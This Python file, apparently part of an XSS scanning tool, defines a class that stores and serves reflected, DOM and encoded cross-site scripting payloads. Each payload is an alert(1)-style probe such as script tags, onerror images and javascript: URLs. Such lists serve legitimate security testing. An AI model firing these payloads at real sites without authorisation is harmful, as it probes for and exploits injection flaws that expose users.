from typing import List, Dict

class PayloadManager:
    REFLECTED_XSS = [
        '<script>alert(1)</script>',
        '<script>alert("XSS")</script>',
        '"><script>alert(1)</script>',
        "javascript:alert(1)",
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert(1)>',
        '<select onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
    ]

    DOM_XSS = [
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        "javascript:alert(String.fromCharCode(88,83,83))",
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
    ]

    ENCODED_PAYLOADS = [
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '%3Cscript%3Ealert(1)%3C/script%3E',
    ]

    def __init__(self):
        self.current_index = 0

    def get_payloads(self, payload_type: str = 'all') -> List[str]:
        if payload_type == 'reflected':
            return self.REFLECTED_XSS
        elif payload_type == 'dom':
            return self.DOM_XSS
        elif payload_type == 'encoded':
            return self.ENCODED_PAYLOADS
        else:
            return self.REFLECTED_XSS + self.DOM_XSS + self.ENCODED_PAYLOADS

    def get_payload_with_context(self) -> List[Dict[str, str]]:
        payloads = []
        for p in self.REFLECTED_XSS:
            payloads.append({
                'payload': p,
                'type': 'reflected',
                'severity': 'high'
            })
        for p in self.DOM_XSS:
            payloads.append({
                'payload': p,
                'type': 'dom',
                'severity': 'high'
            })
        for p in self.ENCODED_PAYLOADS:
            payloads.append({
                'payload': p,
                'type': 'encoded',
                'severity': 'medium'
            })
        return payloads

    def get_random_payload(self) -> str:
        import random
        all_payloads = self.get_payloads()
        return random.choice(all_payloads)

    def get_all_payloads(self) -> List[str]:
        return self.get_payloads('all')
